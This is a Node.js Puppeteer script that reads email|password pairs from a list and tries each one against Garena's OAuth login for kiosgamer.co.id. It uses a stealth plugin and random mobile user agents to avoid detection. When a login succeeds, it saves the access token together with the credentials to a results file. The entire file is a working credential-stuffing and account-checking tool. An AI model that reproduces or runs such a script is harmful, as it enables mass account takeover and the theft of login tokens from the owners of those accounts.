const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
puppeteer.use(StealthPlugin());
const UserAgent = require("user-agents");
const date = () => new Date().toLocaleTimeString();
const fs = require("fs");

var datas = fs.readFileSync('./akusn.txt', 'utf8');
data = datas.split(/\r?\n/);

(async () => {
  process.setMaxListeners(0);
  for (let getData of data){
    try{    
        let dataFilter = getData.split("|")
    
        let email = dataFilter[0]
        let password = dataFilter[1]
        const userAgent = new UserAgent({
            deviceCategory: "mobile",
            platform: "Linux x86_64",
        });
        const browser = await puppeteer.launch({
            headless: true,
            devtools: true,
            args: [`--user-agent=${userAgent}`, `--window-size=350,700`],
        });
        const [page] = await browser.pages();
        var usrAgen = userAgent.toString().replace(/\r?\n|\r/, "");
        await page.setUserAgent(usrAgen);
        await page.setViewport({ width: 350, height: 700 });

        await page.goto(
            "https://authgop.garena.com/oauth/login?client_id=10017&redirect_uri=https%3A%2F%2Fkiosgamer.co.id%2Fapp&response_type=token&platform=1&locale=id-ID&theme=mshop_iframe_white"
        );
        console.log(`(${date()}) (${email}) ==> Trying to Login`);
        try {
            await page.waitForSelector("#sso_login_form_account", {
                visible: true,
                timeout: 30000,
            });
            await page.type("#sso_login_form_account", email,{ delay: 100 });
            
            await page.waitForSelector("#sso_login_form_password", {
                visible: true,
                timeout: 30000,
            });
            await page.type("#sso_login_form_password", password,{ delay: 100 });
            await page.click('#confirm-btn');
            const [response] = await Promise.all([
                page.waitForResponse((response) => response.url().includes("https://kiosgamer.co.id/app?access_token=")),
            ]);
         
            console.log(`(${date()}) (${email}) ==> ${response._url}`);
            fs.appendFileSync('result.txt',`${email}|${password}|${response._url}\n`)
            await browser.close();
        }
        catch(e){
            console.log(`(${date()}) (${email}) Failed Get Token: ${e}`)
            fs.appendFileSync('failed.txt',`${email}|${password}\n`)
            if (browser) {
                await browser.close();
            }
        }
    }
    catch(e){
        console.log(`(${date()}) (${email}) Failed Get Token: ${e}`)
        fs.appendFileSync('failed.txt',`${email}|${password}\n`)
        if (browser) {
            await browser.close();
        }
    }
  }
})();
